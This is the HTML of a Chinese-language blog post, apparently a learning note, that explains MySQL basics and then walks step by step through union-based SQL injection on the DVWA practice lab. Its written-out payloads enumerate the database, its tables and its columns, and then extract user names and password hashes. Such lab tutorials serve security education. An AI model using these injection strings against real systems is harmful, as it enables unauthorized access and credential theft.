@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>联合查询 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="[TOC] 一、MySQL基础1、数据库  SQL 是用于访问和处理数据库的标准的计算机语言。SQL (Structured QueryLanguage:结构化查询语言) 是用于管理关系数据库管理系统（RDBMS）。SQL 的范围包括数据插入、查询、更新和删除，数据库模式创建和修改，以及数据访问控制。 （1）就是用来存放数据的仓库。 （2）RDBMS 指关系型数据库管理系统。RDBMS 中的数据存">
+<meta property="og:type" content="article">
+<meta property="og:title" content="联合查询">
+<meta property="og:url" content="http://example.com/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="[TOC] 一、MySQL基础1、数据库  SQL 是用于访问和处理数据库的标准的计算机语言。SQL (Structured QueryLanguage:结构化查询语言) 是用于管理关系数据库管理系统（RDBMS）。SQL 的范围包括数据插入、查询、更新和删除，数据库模式创建和修改，以及数据访问控制。 （1）就是用来存放数据的仓库。 （2）RDBMS 指关系型数据库管理系统。RDBMS 中的数据存">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/01.png">
+<meta property="og:image" content="http://example.com/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/02.png">
+<meta property="og:image" content="http://example.com/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/03.png">
+<meta property="og:image" content="http://example.com/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/04.png">
+<meta property="og:image" content="http://example.com/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/05.png">
+<meta property="og:image" content="http://example.com/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/06.png">
+<meta property="og:image" content="http://example.com/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/07.png">
+<meta property="og:image" content="http://example.com/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/08.png">
+<meta property="og:image" content="http://example.com/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/09.png">
+<meta property="og:image" content="http://example.com/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/10.png">
+<meta property="og:image" content="http://example.com/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/11.png">
+<meta property="og:image" content="http://example.com/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/12.png">
+<meta property="og:image" content="http://example.com/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/13.png">
+<meta property="article:published_time" content="2022-03-05T06:42:51.000Z">
+<meta property="article:modified_time" content="2022-03-05T07:53:53.024Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/01.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-05联合查询" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/" class="article-date">
+  <time class="dt-published" datetime="2022-03-05T06:42:51.000Z" itemprop="datePublished">2022-03-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      联合查询
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+       
+        <p>[TOC]</p>
+<h1 id="一、MySQL基础"><a href="#一、MySQL基础" class="headerlink" title="一、MySQL基础"></a>一、MySQL基础</h1><h2 id="1、数据库"><a href="#1、数据库" class="headerlink" title="1、数据库"></a>1、数据库</h2><p>  SQL 是用于访问和处理数据库的标准的计算机语言。SQL (Structured Query<br>Language:结构化查询语言) 是用于管理关系数据库管理系统（RDBMS）。SQL 的范围包括数据插入、查询、更新和删除，数据库模式创建和修改，以及数据访问控制。</p>
+<p>（1）就是用来存放数据的仓库。</p>
+<p>（2）RDBMS 指关系型数据库管理系统。RDBMS 中的数据存储在被称为<strong>表</strong>的<strong>数据库</strong>对象中。表是相关的数据项的集合，它由<strong>列</strong>和<strong>行</strong>组成</p>
+<p>（3）库-&gt;表-&gt;列-&gt;行</p>
+<h2 id="2、数据库相关指令"><a href="#2、数据库相关指令" class="headerlink" title="2、数据库相关指令"></a>2、数据库相关指令</h2><p>01、显示数据库 show databases；<br>02、打开数据库 use db_name;<br>03、显示数据表 show tables;<br>04、显示表结构 describe table_name;<br>05、显示表中各字段信息，即表结构 show columns from table_name;<br>06、显示表创建过程 show create table 表名;<br>07、列出当前mysql的相关状态信息 status;<br>08、删除数据库 drop database 数据库名;<br>09、清空数据表 delete from table_name; truncate table table_name;<br>10、删除数据表 drop table table_name<br>11、数据库连接 mysql –uroot -proot<br>12、数据库退出 exit</p>
+<h2 id="3、什么是SQL注入？"><a href="#3、什么是SQL注入？" class="headerlink" title="3、什么是SQL注入？"></a>3、什么是SQL注入？</h2><p>  SQL注入是一种将SQL代码插入或添加到应用的输入参数中的攻击，之后再将这些参数传递给后台的SQL服务加以解析并执行。</p>
+<p>  凡是构造SQL语句的步骤均存在被潜在攻击的风险。SQL注入的主要方式是直接<strong>将代码插入参数中</strong>，这些参数会被置入SQL命令中加以执行。</p>
+<p>  攻击者把SQL命令语句作为输入被服务器SQL解释器正确解析执行，数据库把查询到的结果返回给服务器，然后呈现给攻击者，攻击者由此获得数据库内的数据信息。</p>
+<h2 id="4、SQL注入产生的条件？"><a href="#4、SQL注入产生的条件？" class="headerlink" title="4、SQL注入产生的条件？"></a>4、SQL注入产生的条件？</h2><p>  用户控制了SQL语句的一部分，用户的输入不再是一个输入参数，而成为了符合语法的SQL语句。</p>
+<h2 id="5、SQL注入的类型？"><a href="#5、SQL注入的类型？" class="headerlink" title="5、SQL注入的类型？"></a>5、SQL注入的类型？</h2><p>按回显方式划分：</p>
+<p>（1）有回显：</p>
+<p>1）联合查询 -&gt; 构造联合查询语句，直接查看查询结果</p>
+<p>2）报错注入-&gt; 构造报错语句，在报错中查看结果</p>
+<p>3）堆查询-&gt; 多行语句执行，进而实现想要达到的目的</p>
+<p>（2）无回显：</p>
+<p>盲注 -&gt; 布尔型/时间型 通过某种手段“爆破”结果</p>
+<h1 id="二、联-合-查-询-注-入-的-利-用"><a href="#二、联-合-查-询-注-入-的-利-用" class="headerlink" title="二、联 合 查 询 注 入 的 利 用"></a>二、联 合 查 询 注 入 的 利 用</h1><h2 id="1、判断是否存在注入"><a href="#1、判断是否存在注入" class="headerlink" title="1、判断是否存在注入"></a>1、判断是否存在注入</h2><p>（以dvwa靶场为例）</p>
+<p>（1）正常查询，输入1，此时最终查询的SQL语句为：</p>
+<p><strong>SELECT first_name, last_name FROM users WHERE user_id = ‘1’;</strong></p>
+<p>查询条件判断为真，返回user_id为1的用户数据：</p>
+<p><img src="/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/01.png" alt="01"></p>
+<p>（2）SQL注入测试，输入 1’ and ‘1’ = ‘2 ，此时最终查询的SQL语句为：</p>
+<p><strong>SELECT first_name, last_name FROM users WHERE user_id = ‘1’ and ‘1’ = ‘2’;</strong></p>
+<p>查询条件判断恒为假，返回结果为空。</p>
+<p><img src="/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/02.png" alt="02"></p>
+<p>（3）SQL注入测试，输入 1’ or ‘1234’ = ‘1234 ，此时最终查询的SQL语句为：</p>
+<p><strong>SELECT first_name, last_name FROM users WHERE user_id = ‘1’ or ‘1234’ = ‘1234’;</strong></p>
+<p>查询条件判断恒为真，返回users表中所有的用户数据。</p>
+<p><img src="/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/03.png" alt="03"></p>
+<h2 id="2、猜解SQL语句中的字数段"><a href="#2、猜解SQL语句中的字数段" class="headerlink" title="2、猜解SQL语句中的字数段"></a>2、猜解SQL语句中的字数段</h2><p>（1）输入1’ or 1=1 order by 1 #，查询成功，直到输入1’ or 1=1 order by 3 #，查询失败，说明2列：</p>
+<p><img src="/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/04.png" alt="04"></p>
+<p>（从 MySQL 表中使用 SQL SELECT 语句来读取数据。如果需要对读取的数据进行排序，就可以使用 MySQL的 ORDER BY 子句来设定你想按哪个字段哪种方式来进行排序，再返回搜索结果。）</p>
+<p>（2）limit x, y;</p>
+<p>表示从x+1行开始的y行数据显示出来</p>
+<p><img src="/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/05.png" alt="05"></p>
+<h2 id="3、确定显示的字段顺序"><a href="#3、确定显示的字段顺序" class="headerlink" title="3、确定显示的字段顺序"></a>3、确定显示的字段顺序</h2><p>（指的就是列数）</p>
+<p>输入1’ union select 1,2 #，查询成功，而输入1’ union select 1,2 ,3#则是失败的。</p>
+<p><img src="/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/06.png" alt="06"></p>
+<p>确定列数：</p>
+<p><img src="/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/07.png" alt="07"></p>
+<h2 id="4、获取当前数据库名"><a href="#4、获取当前数据库名" class="headerlink" title="4、获取当前数据库名"></a>4、获取当前数据库名</h2><p>输入1’ union select 1,database() #，查询成功</p>
+<p>说明当前的数据库为dvwa</p>
+<p><img src="/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/08.png" alt="08"></p>
+<p><img src="/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/09.png" alt="09"></p>
+<h2 id="5、获取当前数据库的表名"><a href="#5、获取当前数据库的表名" class="headerlink" title="5、获取当前数据库的表名"></a>5、获取当前数据库的表名</h2><p>输入1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：</p>
+<p>说明数据库dvwa中一共有两个表，guestbook与users。</p>
+<p><img src="/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/10.png" alt="10"></p>
+<p><img src="/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/11.png" alt="11"></p>
+<p><strong>注：Information_schema</strong><br>  <strong>在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。</strong></p>
+<p>  <strong>SCHEMATA表</strong>：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表</p>
+<p>  <strong>TABLES表：</strong>提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表</p>
+<p>  <strong>COLUMNS表：</strong>提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。</p>
+<h2 id="6、获取表中的字段名（列名）"><a href="#6、获取表中的字段名（列名）" class="headerlink" title="6、获取表中的字段名（列名）"></a>6、获取表中的字段名（列名）</h2><p>输入1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #，查询成功</p>
+<p><img src="/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/12.png" alt="12"></p>
+<h2 id="7、查询数据"><a href="#7、查询数据" class="headerlink" title="7、查询数据"></a>7、查询数据</h2><p>输入1’ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：</p>
+<p><img src="/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/13.png" alt="13"></p>
+<p><strong>注：如果group_concat被过滤了，而又只能返回一条数据，怎么办？ 用limit</strong></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/" data-id="cl0djv72o0000jsv1avam4ouw" data-title="联合查询" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2022/03/05/04hexo%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">hexo上传图片</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/03/05/05%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/">联合查询</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/05/04hexo%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87/">hexo上传图片</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/04/dvwa/">dvwa</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/04/%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%8F%8A%E5%93%88%E5%B8%8C%E7%BB%95%E8%BF%87/">弱类型及哈希绕过</a>
+          </li>
+        
+          <li>
+            <a href="/2021/11/25/PHP%E8%AF%AD%E6%B3%95%E5%92%8C%E5%8F%98%E9%87%8F/">PHP语法和变量</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
